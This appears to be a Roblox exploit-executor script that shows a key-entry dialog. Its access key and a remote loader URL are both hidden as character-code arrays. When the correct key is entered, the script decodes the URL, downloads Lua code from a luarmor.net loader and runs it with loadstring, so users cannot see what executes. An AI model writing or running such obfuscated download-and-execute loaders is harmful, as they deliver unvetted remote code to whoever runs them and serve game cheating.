local keyData = {76, 101, 109, 111, 110}

local function decodeKey(tbl)
    local result = ""
    for _, v in ipairs(tbl) do
        result = result .. string.char(v)
    end
    return result
end

local validKey = decodeKey(keyData)

local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "KeySystem"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 320, 0, 150)
frame.Position = UDim2.new(0.5, -160, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)

local label = Instance.new("TextLabel", frame)
label.Text = "🔑 Enter key:"
label.Size = UDim2.new(1, -20, 0, 40)
label.Position = UDim2.new(0, 10, 0, 10)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.SourceSansBold
label.TextSize = 22
label.TextXAlignment = Enum.TextXAlignment.Left

local box = Instance.new("TextBox", frame)
box.PlaceholderText = "Type your key here"
box.Size = UDim2.new(0.9, 0, 0, 35)
box.Position = UDim2.new(0.05, 0, 0, 60)
box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
box.TextColor3 = Color3.fromRGB(255, 255, 255)
box.Font = Enum.Font.SourceSans
box.TextSize = 18
box.ClearTextOnFocus = false

local button = Instance.new("TextButton", frame)
button.Text = "Submit"
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 105)
button.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 20
button.AutoButtonColor = true

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 25)
feedback.Position = UDim2.new(0, 10, 1, -30)
feedback.TextColor3 = Color3.fromRGB(255, 80, 80)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.Font = Enum.Font.SourceSansItalic
feedback.TextSize = 16
feedback.TextWrapped = true

local encryptedURL = {
    104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,
    47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,
    102,102,100,102,101,97,100,102,48,97,102,55,57,56,55,52,49,56,48,54,101,97,
    52,48,52,54,56,50,97,57,51,56,46,108,117,97
}

local function decodeURL(tbl)
    local s = ""
    for _, v in ipairs(tbl) do
        s = s .. string.char(v)
    end
    return s
end

button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$")

    if input == validKey then
        feedback.Text = ""
        gui:Destroy()

        local url = decodeURL(encryptedURL)
        print("Loading script from:", url)

        local success, result = pcall(function()
            return game:HttpGet(url)
        end)

        if success then
            local func, err = loadstring(result)
            if func then
                func()
            else
                warn("Script compile error:", err)
            end
        else
            warn("Failed to load script:", result)
        end
    else
        feedback.Text = "Invalid key"
        wait(2)
        feedback.Text = ""
    end
end)
